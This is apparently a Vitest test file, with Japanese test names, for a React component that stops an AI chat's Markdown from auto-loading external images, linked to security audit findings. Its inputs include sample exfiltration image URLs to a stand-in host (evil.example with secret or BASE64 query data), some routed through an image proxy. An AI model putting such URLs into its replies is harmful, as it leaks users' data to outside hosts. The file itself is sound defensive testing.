// @vitest-environment jsdom
import { act } from "react";
import { createRoot } from "react-dom/client";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { beforeEach, describe, expect, it } from "vitest";
import { buildMarkdownComponents } from "./panel";
import { externalImageHost, GatedMarkdownImage, isExternalImageSrc, rememberLoadedImage, resetLoadedImagesForTest } from "./gated-markdown-image";

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

describe("AI チャットの Markdown 画像（監査 #34 #20 #52 #97）", () => {
  beforeEach(() => resetLoadedImagesForTest());
  it("外部の判定: http / https / プロトコル相対", () => {
    expect(isExternalImageSrc("https://evil.example/p?d=secret")).toBe(true);
    expect(isExternalImageSrc("HTTP://evil.example/x")).toBe(true);
    expect(isExternalImageSrc("//evil.example/x")).toBe(true);
    expect(isExternalImageSrc("data:image/png;base64,AAAA")).toBe(false);
    expect(isExternalImageSrc("blob:http://localhost/abc")).toBe(false);
    expect(isExternalImageSrc("media://abc")).toBe(false);
    expect(isExternalImageSrc("local-media://abc")).toBe(false);
    // 相対パス（image-proxy 経由）も外部扱い
    expect(isExternalImageSrc("/api/url/image-proxy?url=https%3A%2F%2Fevil.example%2Fc%3Fd%3DSECRET")).toBe(true);
    expect(isExternalImageSrc("/anything.png")).toBe(true);
  });

  it("ホスト名だけを取り出す（パスとクエリは出さない）", () => {
    expect(externalImageHost("https://evil.example/p?d=secret")).toBe("evil.example");
    expect(externalImageHost("//cdn.example/x")).toBe("cdn.example");
  });

  it("外部画像は <img> にならず、ホストとボタンの枠になる", () => {
    const html = renderToStaticMarkup(<GatedMarkdownImage src="https://evil.example/p?d=secret" alt="x" />);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("secret");
    expect(html).toContain("evil.example");
    expect(html).toContain("<button");
  });

  it("image-proxy 経由の相対パスも <img> にならず、中身のホストが枠に出る", () => {
    const src = "/api/url/image-proxy?url=https%3A%2F%2Fevil.example%2Fc%3Fd%3DSECRET";
    expect(externalImageHost(src)).toBe("evil.example");
    const html = renderToStaticMarkup(<GatedMarkdownImage src={src} alt="x" />);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("SECRET");
    expect(html).toContain("<button");
  });

  it("ReactMarkdown 経由の ![](/api/url/image-proxy?url=...) も <img> にならない", () => {
    const html = renderToStaticMarkup(
      <ReactMarkdown components={{ img: ({ src, alt }) => <GatedMarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} /> }}>
        {"![x](/api/url/image-proxy?url=https%3A%2F%2Fevil.example%2Fc%3Fd%3DSECRET)"}
      </ReactMarkdown>,
    );
    expect(html).not.toContain("<img");
  });

  it("data: の画像は従来どおり <img>", () => {
    const html = renderToStaticMarkup(<GatedMarkdownImage src="data:image/png;base64,AAAA" alt="x" />);
    expect(html).toContain("<img");
  });

  it("ReactMarkdown 経由でも外部画像は読み込まれず、押すと <img> になる", () => {
    const host = document.createElement("div");
    document.body.appendChild(host);
    const root = createRoot(host);
    act(() => {
      root.render(
        <ReactMarkdown components={{ img: ({ src, alt }) => <GatedMarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} /> }}>
          {"![x](https://evil.example/c?d=BASE64)"}
        </ReactMarkdown>,
      );
    });
    expect(host.querySelector("img")).toBeNull();
    act(() => {
      host.querySelector("button")!.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    expect(host.querySelector("img")?.getAttribute("src")).toBe("https://evil.example/c?d=BASE64");
    act(() => root.unmount());
    host.remove();
  });

  it("実際の配線（panel の buildMarkdownComponents）でも外部画像は <img> にならない", () => {
    const html = renderToStaticMarkup(
      <ReactMarkdown components={buildMarkdownComponents(undefined)}>
        {"![x](https://evil.example/c?d=BASE64)"}
      </ReactMarkdown>,
    );
    expect(html).not.toContain("<img");
    expect(html).toContain("evil.example");
  });

  it("components を使い回していれば、再描画しても読み込んだ画像が枠に戻らない", () => {
    const host = document.createElement("div");
    document.body.appendChild(host);
    const root = createRoot(host);
    const components = buildMarkdownComponents(undefined);
    const view = () => (
      <ReactMarkdown components={components}>{"![x](https://evil.example/c?d=BASE64)"}</ReactMarkdown>
    );
    act(() => root.render(view()));
    act(() => {
      host.querySelector("button")!.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    expect(host.querySelector("img")).not.toBeNull();
    act(() => root.render(view()));
    expect(host.querySelector("img")).not.toBeNull();
    act(() => root.unmount());
    host.remove();
  });

  it("一度押した URL は再マウントされても読み込み済みで始まり、押していない URL は枠のまま", () => {
    const pressed = "https://pressed.example/a.png";
    const other = "https://other.example/b.png";
    expect(renderToStaticMarkup(<GatedMarkdownImage src={pressed} alt="x" />)).toContain("<button");
    rememberLoadedImage(pressed);
    // 新しく描き直す（再マウント相当）
    const again = renderToStaticMarkup(<GatedMarkdownImage src={pressed} alt="x" />);
    expect(again).toContain("<img");
    expect(again).not.toContain("<button");
    expect(renderToStaticMarkup(<GatedMarkdownImage src={other} alt="x" />)).toContain("<button");
  });
});
